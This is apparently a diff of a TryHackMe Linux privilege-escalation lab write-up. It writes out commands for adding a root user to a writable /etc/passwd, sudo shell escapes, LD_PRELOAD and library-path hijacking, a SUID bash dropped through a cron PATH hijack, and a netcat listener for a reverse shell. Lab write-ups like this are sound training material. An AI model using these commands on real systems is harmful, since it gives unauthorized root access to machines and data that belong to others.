@@ -114,7 +114,7 @@ In this task we utilize insecure read permissions for the /etc/shadow file.
 
 ### Weak File Permissions - Writable /etc/shadow
 
-
+In this task we utilize insecure write permissions for the /etc/shadow file.
 
 *Read and follow along with the above.*
 
@@ -138,32 +138,51 @@ Now we can switch to the root user with our own password.
 
 ### Weak File Permissions - Writable /etc/passwd
 
+In this task we utilize insecure write permissions for the /etc/passwd file.
+
+We first use the following command to find the permissions we have for the `/etc/passwd` file.
+
+```cmd
+ls -l /etc/passwd
+```
+
+![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Permissions.png)
+
+Looks like we have write access. Lets create a new password for the root user we can substitute. This can be done on our target machine or attack machine. Due to the way the machines are setup the resulting hashes may be different as they use a different method. However, the outcome should be the same.
+
+```cmd
+openssl passwd iamroot
+```
+
+![Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Creation.png)
+
+We can do two things now. We can either replace the root users password with our new one. Or we can copy the root user line in the `passwd` file and change the name and password. I will use the second option here.
+
+![Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Modification.png)
+
+Now we can switch to our new user with the following and enter the newly created password:
+
+```cmd
+su newroot
+```
+
+![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Root.png)
+
 1. Run the "id" command as the newroot user. What is the result?
 
-   ![Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Modification.png)
+   ![Id](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Id.png)
 
    ><details><summary>Click for answer</summary>uid=0(root) gid=0(root) groups=0(root)</details>
 
 ### Sudo - Shell Escape Sequences
 
-![Apache 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Apache2.png)
-![Awk](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Awk.png)
-![Find](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Find.png)
-![Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Ftp.png)
-![Iftop](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Iftop.png)
-![Less](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Less.png)
-![Man](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Man.png)
-![More](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_More.png)
-![Nano](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nano.png)
-![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nmap.png)
-![Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Vim.png)
-
+In this task we will abuse the insecure sudo settings for various bins on the file system.
 
 1. How many programs is "user" allowed to run via sudo? 
 
    We can use `sudo -l` to view all the executables we can run with sudo.
    
-   ![]()
+   ![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Sudo.png)
    
    ><details><summary>Click for answer</summary>11</details>
    
@@ -173,7 +192,17 @@ Now we can switch to the root user with our own password.
    
    ><details><summary>Click for answer</summary>apache2</details>
 
-We can use (https://gtfobins.github.io/) to find out how to get an elevated shell with each binary.
+*Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*
+
+```cmd
+sudo apache2 -f /etc/shadow
+```
+
+![Apache 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Apache2.png)
+
+https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
+
+**Extra challenge:** We can use (https://gtfobins.github.io/) to find out how to get an elevated shell with each binary.
 
 **awk**
 
@@ -181,7 +210,7 @@ We can use (https://gtfobins.github.io/) to find out how to get an elevated shel
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-![]()
+![Awk](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Awk.png)
 
 **iftop**
 
@@ -190,7 +219,7 @@ sudo iftop
 !/bin/sh
 ```
 
-![]()
+![Iftop](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Iftop.png)
    
 **find**
 
@@ -198,7 +227,7 @@ sudo iftop
 sudo find . -exec /bin/sh \; -quit
 ```
 
-![]()
+![Find](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Find.png)
 
 **ftp**
 
@@ -207,7 +236,7 @@ sudo ftp
 !/bin/sh
 ```
 
-![]()
+![Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Ftp.png)
 
 **less**
 
@@ -216,7 +245,7 @@ sudo less /etc/profile
 !/bin/sh
 ```
 
-![]()
+![Less](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Less.png)
 
 **man**
 
@@ -225,7 +254,7 @@ sudo man man
 !/bin/sh
 ```
 
-![]()
+![Man](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Man.png)
 
 **more**
 
@@ -234,7 +263,7 @@ TERM= sudo more /etc/profile
 !/bin/sh
 ```
 
-![]()
+![More](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_More.png)
 
 **nano**
 
@@ -244,7 +273,7 @@ sudo nano
 reset; sh 1>&0 2>&0
 ```
 
-![]()
+![Nano](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nano.png)
 
 **nmap**
 
@@ -253,61 +282,68 @@ sudo nmap --interactive
 nmap> !sh
 ```
 
-![]()
+![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nmap.png)
 
 **vim**
 
 ```cmd
 sudo vim -c ':!/bin/sh'
 ```
-![]()
 
-*Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*
-
-```cmd
-sudo apache2 -f /etc/shadow
-```
-
-![]()
-
-https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
+![Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Vim.png)
 
 ### Sudo - Environment Variables
 
-![Libraries](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Libraries.png)
-![Library](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Library.png)
-![Pre Load](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Preload.png)
+In this task we will use the environmental variable settings for sudo.
 
+Using `sudo -l` we can check which environment variables are inherited.
+
+![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Sudo.png)
 
 *Read and follow along with the above.*
+
+First we create a shared object using the code provided:
 
 ```cmd
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 ```
+
+Next, we run one of the programs we are allowed to run with sudo
+
 ```cmd
 sudo LD_PRELOAD=/tmp/preload.so find
 ```
 
-![]()
+![Pre Load](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Preload.png)
+
+We run `ldd` to check which shared libraries are used by the program.
 
 ```cmd
 ldd /usr/sbin/apache2
 ```
 
-![]()
+![Libraries](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Libraries.png)
+
+Now we created another shared object with the same name as one of the listed libraries.
 
 ```cmd
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 ```
+
+And now we run apache with sudo
+
 ```cmd
 sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
-![]()
+![Library](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Library.png)
 
 ### Cron Jobs - File Permissions
 
 cat /etc/crontab
+
+![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)
+
 locate overwrite.sh
 ls -l /usr/local/bin/overwrite.sh
 nano /usr/local/bin/overwrite.sh
@@ -319,38 +355,67 @@ nc -nvlp 4444
 
 
 
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png
+
+![Job](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png)
+![Locate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png)
+![Permission](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png)
 
 
 ### Cron Jobs - PATH Environment Variable
 
 cat /etc/crontab
 
+![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)
+
+touch overwrite.sh
+nano overwrite.sh
+
+![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Create_Script.png)
 
 #!/bin/bash
 
 cp /bin/bash /tmp/rootbash
 chmod +xs /tmp/rootbash
 
+
+![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Script.png)
+
 chmod +x /home/user/overwrite.sh
 
+![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Chmod.png)
+
 /tmp/rootbash -p
+
+![Variable](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png)
 
 rm /tmp/rootbash
 exit
 
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png
+![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png)
 
 
 
 /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 ### Cron Jobs - Wildcards
+
+*Read and follow along with the above.*
+
+
+
+
+![Compress](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Compress.png)
+![Create Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Create_Files.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Root_Shell.png)
+![Scp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Scp.png)
+
+
+
+
+
+
+
 ### SUID / SGID Executables - Known Exploits
 ### SUID / SGID Executables - Shared Object Injection
 ### SUID / SGID Executables - Environment Variables
